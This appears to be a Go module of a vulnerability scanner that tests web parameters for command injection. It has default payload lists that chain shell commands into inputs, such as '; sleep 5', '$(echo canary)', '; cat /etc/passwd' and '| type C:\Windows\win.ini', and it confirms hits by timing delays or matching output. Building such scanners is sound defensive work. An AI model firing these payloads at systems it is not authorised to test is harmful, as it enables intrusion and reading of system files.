package cmdi

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"time"

	"vulnscan-backend/model"
	"vulnscan-backend/pkg/payload"
	"vulnscan-backend/scan/engine"
)

type CMDiScanner struct {
	base     *engine.VulnScanner
	payloads *payload.Loader
}

func New(loader *payload.Loader) *CMDiScanner {
	return &CMDiScanner{payloads: loader}
}

func (m *CMDiScanner) ID() string       { return "cmdi" }
func (m *CMDiScanner) Name() string     { return "命令注入检测" }
func (m *CMDiScanner) Category() string { return "vuln" }

func (m *CMDiScanner) Params() []engine.ModuleParam {
	return []engine.ModuleParam{engine.VulnVerificationParam()}
}

func (m *CMDiScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
	m.base = engine.NewVulnScanner(config, engine.WithRedirectPolicy(engine.RedirectNoFollow))
	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *CMDiScanner) testTarget(ctx context.Context, target *engine.Target, verifyLevel string) []*engine.Finding {
	points := engine.ExtractInjectionPoints(target)
	if len(points) == 0 {
		parsed, err := url.Parse(target.URL)
		if err != nil || len(parsed.Query()) == 0 {
			return nil
		}
		for param := range parsed.Query() {
			points = append(points, engine.InjectionPoint{
				Type: engine.InjectQuery,
				Name: param,
			})
		}
	}

	if len(points) == 0 {
		return nil
	}

	var findings []*engine.Finding
	canary := genCanary()

	for _, point := range points {
		if engine.ShouldRunExploit(verifyLevel) {
			if f := m.testTimeBased(ctx, target, point); f != nil {
				f.VerificationLevel = engine.VerifyExploit
				f.VerificationDetail = "time-delay-confirmed"
				findings = append(findings, f)
				continue
			}
			if f := m.testOutputBased(ctx, target, point, canary); f != nil {
				f.VerificationLevel = engine.VerifyExploit
				f.VerificationDetail = "command-output-confirmed"
				findings = append(findings, f)
			}
		}
	}

	return findings
}

type cmdiPayloadEntry struct {
	value   string
	os      string
	variant string
}

func (m *CMDiScanner) getTimePayloads() []cmdiPayloadEntry {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("cmdi")
		var result []cmdiPayloadEntry
		for _, p := range dbPayloads {
			if p.Type == "time" || p.Type == "oob" {
				os := "linux"
				if strings.Contains(p.Databases, "windows") {
					os = "windows"
				}
				result = append(result, cmdiPayloadEntry{
					value:   p.Value,
					os:      os,
					variant: p.Tags,
				})
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	return defaultTimePayloads()
}

func (m *CMDiScanner) getOutputPayloads(canary string) []cmdiPayloadEntry {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("cmdi")
		var result []cmdiPayloadEntry
		for _, p := range dbPayloads {
			if p.Type == "basic" || p.Type == "rce" {
				os := "linux"
				if strings.Contains(p.Databases, "windows") {
					os = "windows"
				}
				value := p.Value
				if strings.Contains(value, "{canary}") {
					value = strings.ReplaceAll(value, "{canary}", canary)
				}
				result = append(result, cmdiPayloadEntry{
					value:   value,
					os:      os,
					variant: p.Tags,
				})
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	return defaultOutputPayloads(canary)
}

func defaultTimePayloads() []cmdiPayloadEntry {
	return []cmdiPayloadEntry{
		{"; sleep 5", "linux", "semicolon"},
		{"| sleep 5", "linux", "pipe"},
		{"|| sleep 5", "linux", "or"},
		{"& sleep 5", "linux", "background"},
		{"`sleep 5`", "linux", "backtick"},
		{"$(sleep 5)", "linux", "subshell"},
		{"\nsleep 5", "linux", "newline"},
		{"& ping -n 5 127.0.0.1 &", "windows", "ping"},
		{"| ping -n 5 127.0.0.1", "windows", "pipe-ping"},
		{"; ping -c 5 127.0.0.1", "linux", "ping"},
		{"& timeout /t 5 &", "windows", "timeout"},
	}
}

func defaultOutputPayloads(canary string) []cmdiPayloadEntry {
	return []cmdiPayloadEntry{
		{fmt.Sprintf("; echo %s", canary), "linux", "echo-semicolon"},
		{fmt.Sprintf("| echo %s", canary), "linux", "echo-pipe"},
		{fmt.Sprintf("$(echo %s)", canary), "linux", "echo-subshell"},
		{fmt.Sprintf("`echo %s`", canary), "linux", "echo-backtick"},
		{"; cat /etc/passwd", "linux", "passwd"},
		{"| type C:\\Windows\\win.ini", "windows", "win-ini"},
		{"; id", "linux", "id-cmd"},
		{"| whoami", "both", "whoami"},
	}
}

func (m *CMDiScanner) testTimeBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint) *engine.Finding {
	baseStart := time.Now()
	m.base.FetchBody(ctx, target.URL)
	baseLatency := time.Since(baseStart)
	threshold := baseLatency + 4*time.Second

	for _, p := range m.getTimePayloads() {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		start := time.Now()
		m.base.SendInjected(ctx, target, point, p.value)
		elapsed := time.Since(start)

		if elapsed >= threshold && elapsed >= 4500*time.Millisecond {
			confirmStart := time.Now()
			m.base.SendInjected(ctx, target, point, p.value)
			confirmElapsed := time.Since(confirmStart)

			if confirmElapsed >= 4*time.Second {
				return &engine.Finding{
					ModuleID:    m.ID(),
					Target:      target,
					Type:        "cmdi_time",
					Title:       fmt.Sprintf("命令注入(Time-based) - %s: %s [%s]", point.Type, point.Name, p.os),
					Description: fmt.Sprintf("%s参数 %s 使用 %s 变体(%s)触发延迟 (%.1fs / %.1fs / 基线 %.1fs)", point.Type, point.Name, p.os, p.variant, elapsed.Seconds(), confirmElapsed.Seconds(), baseLatency.Seconds()),
					Severity:    "critical",
					Confidence:  85,
					Timestamp:   time.Now(),
					Data: map[string]string{
						"param":      point.Name,
						"payload":    p.value,
						"os":         p.os,
						"variant":    p.variant,
						"type":       "time-based",
						"inject_via": string(point.Type),
					},
				}
			}
		}
	}
	return nil
}

func (m *CMDiScanner) testOutputBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint, canary string) *engine.Finding {
	for _, p := range m.getOutputPayloads(canary) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		body, _, _ := m.base.SendInjected(ctx, target, point, p.value)

		var detected bool
		var evidence string

		if strings.Contains(body, canary) {
			detected = true
			evidence = fmt.Sprintf("canary '%s' reflected in response", canary)
		} else if strings.Contains(body, "root:x:0:0") {
			detected = true
			evidence = "/etc/passwd content detected"
		} else if strings.Contains(body, "[fonts]") {
			detected = true
			evidence = "win.ini content detected"
		} else if strings.Contains(body, "uid=") && strings.Contains(body, "gid=") {
			detected = true
			evidence = "id command output detected"
		}

		if detected {
			return &engine.Finding{
				ModuleID:    m.ID(),
				Target:      target,
				Type:        "cmdi_output",
				Title:       fmt.Sprintf("命令注入(Output-based) - %s: %s [%s]", point.Type, point.Name, p.os),
				Description: fmt.Sprintf("%s参数 %s 使用 %s 变体成功执行命令: %s", point.Type, point.Name, p.variant, evidence),
				Severity:    "critical",
				Confidence:  90,
				Evidence:    engine.Truncate(body, 500),
				Timestamp:   time.Now(),
				Data: map[string]string{
					"param":      point.Name,
					"payload":    p.value,
					"os":         p.os,
					"variant":    p.variant,
					"type":       "output-based",
					"evidence":   evidence,
					"inject_via": string(point.Type),
				},
			}
		}
	}
	return nil
}

func genCanary() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "rce" + hex.EncodeToString(b)
}

var _ = model.VulnPayload{}
